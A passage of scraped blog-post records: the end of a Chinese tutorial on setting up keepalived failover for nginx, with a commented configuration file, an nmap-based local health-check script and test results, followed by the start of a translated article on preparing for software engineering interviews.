class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-54\">54</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-1\"><span class=\"crayon-o\">!</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Configuration</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">keepalived</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-2\"><span class=\"crayon-p\">#全局配置</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-3\"><span class=\"crayon-e\">global_defs</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#keepalived切换的时候，发消息到指定的email，可配置多个email</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-5\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">notification_email</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-6\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">feinik1</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-7\"><span class=\"crayon-e\">\t </span><span class=\"crayon-v\">feinik2</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-8\"><span class=\"crayon-h\">   </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-9\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#通知邮件从哪个地址发出</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-10\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">notification_email_from </span><span class=\"crayon-v\">feinik</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-11\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#通知邮件的smtp地址</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-12\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">smtp_server </span><span class=\"crayon-v\">smtp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">exmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">qq</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-13\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#连接smtp服务器的超时时间，单位秒</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-14\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">smtp_connect</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-15\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#Keepalived的机器标识，一个网络内保持唯一</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-16\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">router_id </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">master</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-17\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-19\"><span class=\"crayon-p\">#执行脚本配置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-20\"><span class=\"crayon-e\">vrrp_script</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">chk_nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#脚本所在路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">script</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/home/project/keepalived/check_nginx.sh\"</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-23\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#脚本执行间隔时间，秒</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">interval</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-25\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#优先级</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-27\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-28\"><span class=\"crayon-p\">#keepalived实例配置</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-29\"><span class=\"crayon-e\">vrrp_instance</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">VI_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-30\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#指定实例的初始状态，MASTER或BACKUP两种状态，并且需要大写</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BACKUP</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-32\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#实例绑定的网卡</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ens33</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-34\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#虚拟路由标识，是一个数字，整个VRRP内唯一，如果keepalived配置了主备，需要相同</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">virtual_router_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-36\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#优先级，数值愈大，优先级越高</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">priority</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">99</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-38\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#MASTER与BACKUP之间同步检查的时间间隔，单位为秒</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">advert_int</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-40\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#通信验证</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">authentication</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">auth_type </span><span class=\"crayon-e\">PASS</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-43\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">auth_pass </span><span class=\"crayon-i\">feinik</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-45\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#追踪外围脚本</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">track_script</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-47\"><span class=\"crayon-h\">\t    </span><span class=\"crayon-p\">#这里配置vrrp_script的名称</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">chk</span><span class=\"crayon-sy\">_</span>nginx</div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-50\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#虚拟ip配置，可配置多个</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">virtual_ipaddress</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-52\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">192.168.10.200</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b0844775861-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b0844775861-54\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0042 seconds] -->\r\n<p></p>\n<h3 id=\"h3_14\">3.5.4 Nginx状态检查脚本创建</h3>\n<p>（1）新建Nginx的状态检查脚本：check_nginx.sh</p>\n<p>（2）内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a346e6b5223836221\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/sh\r\nNGINX=/usr/common/nginx/sbin/nginx\r\nPORT=80\r\nnmap localhost -p $PORT | grep \"$PORT/tcp open\"\r\n#echo $?\r\nif [ $? -ne 0 ];then\r\n    $NGINX -s stop\r\n    #这里再次尝试启动NG\r\n    $NGINX\r\n    sleep 5\r\n    nmap localhost -p $PORT | grep \"$PORT/tcp open\"\r\n    [ $? -ne 0 ] &amp;&amp; cd /usr/common/keepalived/sbin &amp;&amp; pkill keepalived\r\n    echo \"stoped\"\r\nfi</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b5223836221-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b5223836221-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-1\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-2\"><span class=\"crayon-v\">NGINX</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">common</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-3\"><span class=\"crayon-v\">PORT</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">80</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-4\"><span class=\"crayon-e\">nmap </span><span class=\"crayon-v\">localhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">PORT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$PORT/tcp open\"</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-5\"><span class=\"crayon-p\">#echo $?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-6\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ne</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">NGINX</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#这里再次尝试启动NG</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">NGINX</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">nmap </span><span class=\"crayon-v\">localhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">PORT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$PORT/tcp open\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ne</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">common</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">keepalived</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pkill </span><span class=\"crayon-e\">keepalived</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6b5223836221-13\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"stoped\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6b5223836221-14\"><span class=\"crayon-v\">fi</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p></p>\n<h1 id=\"h1_15\">4 运行测试</h1>\n<p>（1）为了更直观的查看到keepalived切换的效果，将11服务器中的nginx的upstream服务只配置11的tomcat服务地址，12服务器中的upstream服务只配置12的tomcat服务地址，这样只需要观察将11服务器中的nginx关闭看使用虚拟ip是否可以访问到12服务器的tomcat。</p>\n<p>（2）分别启动两个服务器中的tomcat、nginx、keepalived，访问虚拟ip：192.168.10.200，可以查看到访问的是主keepalived服务器的tomcat</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fml0nugsrvj211u0bv467.jpg\" width=\"690\" height=\"216\"></p>\n<p>（3）关闭11服务器的nginx，nginx -s stop，再次访问虚拟ip，如下：说明主keepalived通过配置的脚本检测到了本服务的nginx服务挂掉了，所以立马切换至了备的keepalived，这时12服务器的keepalived升为了主，所以就访问到了12服务器的tomcat。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fml0nuzmagj211v0c1ahf.jpg\" width=\"690\" height=\"219\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113347\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113347votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113347\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/2d4fd40c8eaec8319c1de2f154b3275aecd23f9d.jpg"}
{"url_object_id": "2f993346404e0e00f4ebfc3ce3334962", "title": "面试软件工程师，这些准备工作你做了吗？", "url": "http://blog.jobbole.com/112148/", "create_date": "2017/12/16", "front_img_url": ["http://ww1.sinaimg.cn/mw690/7cc829d3gw1f3wgmive0tj218g0p1gun.jpg"], "praise_nums": 2, "comment_nums": 4, "favor_nums": 1, "tags": "职场,技术面试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://codeburst.io/the-2-types-of-software-engineering-interviews-and-how-to-prepare-for-them-2e7bd4daa0bhttps://codeburst.io/the-2-types-of-software-engineering-interviews-and-how-to-prepare-for-them-2e7bd4daa0b\">Connor Leech</a>   译文出处：<a target=\"_blank\" href=\"http://36kr.com/p/5107412.html\">36氪</a>   </div><p>本文作者 Connor Leech 是在湾区工作的一名 Web 开发人员，他在本文中面向那些正寻求找到一个软件工程师岗位的求职者，探讨了他们在面试环节可以采取的准备工作。虽然各个公司对于评估人才有自己不同的标准，但软件工程岗位面试大致可分为两类：特定领域知识面试和计算机科学基础知识面试。求职者了解公司评估方式之后，也就可以有的放矢，分别采取相应的准备策略。</p>\n<p><img class=\"alignnone\" src=\"http://ww1.sinaimg.cn/mw690/7cc829d3gw1f3wgmive0tj218g0p1gun.jpg\" width=\"690\" height=\"389\"></p>\n<hr>\n<p>作为一名软件工程师，能否通过技术面试对于自己的职业发展至关重要，但是求职者往往很难知道具体怎样去为面试做准备。因为不同的软件公司采用不同的方式对工程师进行评估，而在这种压力很大、同时又很重要的场合，毫无防备的前去面试似乎是最糟糕的一种状态。</p>\n<p>幸运的一点是，这些技术面试通常可以分为两大类：特定领域知识面试和计算机科学基础知识面试。对于想走上软件工程师职业发展道路的求职者来说，了解这些评估人才的不同方法是很重要的一点，从而可以在他们最需要改进的地方采取措施进行进一步的提升。本篇文章介绍了每种面试类型可能出现的问题，以及你可以采取的准备措施。</p>\n<p><strong>特定领域知识面试</strong></p>\n<p>特定领域知识面试通常涉及到你最熟悉的技术领域的具体知识点。例如，如果你主要使用 Angular 1.x 进行前端开发，并且面试公司又有 Angular 前端，那他们就可能问你关于 Angular 控制器、指令和服务的相关内容。也就是说，你需要做好准备去建立、展示和讨论 Angular。</p>\n<p>特定领域的面试重点关注的是你已经实际构建起来的东西，因此要想顺利通过这些面试，最好是你已经构建过相关技术的项目。你应该为自己的工作而感到自豪，不必感觉不好意思，而应该深入探讨具体项目的技术细节。项目最好是近阶段完成的，没人会愿意去听你去年写的那些代码，你自己也会对这种陈旧的项目感觉厌倦，面试效果也欠佳。</p>\n<p>特定领域面试的另一个常见策略是看求职者能否构建一些非常棒的产品或者是排除实际存在的一些问题和故障。这通常是让求职者带回家去完成的一种测试，求职者一般有 24-48 个小时的时间来完成这些测试。例如，如果你是一名 Laravel 开发人员，并且你面试的公司恰好也使用 Laravel，那他们可能会要求你构建公司产品或者是公司定期创建的产品的微缩版本。对于这种带回家做的测试，做好投入大量工作的心理准备。准备好启动模板，不要抗拒去 Google 